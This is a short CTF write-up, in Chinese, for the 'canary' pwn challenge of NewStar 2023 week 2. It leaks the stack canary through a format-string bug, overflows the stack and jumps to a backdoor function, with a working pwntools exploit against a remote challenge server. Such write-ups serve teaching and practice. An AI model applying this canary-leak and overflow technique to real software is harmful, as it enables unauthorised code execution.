---
title: newstar2023 week2 - canary
date: 2023/10/1 12:00:00
updated: 2024/7/25 12:34:56
tags:
    - noob
excerpt: 利用格式化字符串漏洞获取canary值，栈溢出后跳转至后门函数。
---

## 文件分析

下载`canary`, NX on, PIE off, Canary on, RELRO full  
ghidra分析为64位程序

## 解题思路

观察程序发现后门函数，且没有pie，首先利用格式化字符串漏洞打印出canary的值，
然后栈溢出补上canary后跳转到后门函数即可

## EXPLOIT

```python
from pwn import *
sh = remote('node4.buuoj.cn', 26476)

# payload 1
sh.sendline(b'%11$p') # get canary

sh.recvuntil(b'gift:\n') # skip
canary = int(sh.recvline()[:18], 16)

# payload 2
backdoor = 0x00401262
sh.sendline(b'0'*0x28 + p64(canary) + b'0'*8 + p64(backdoor))

sh.interactive()
```

Done.
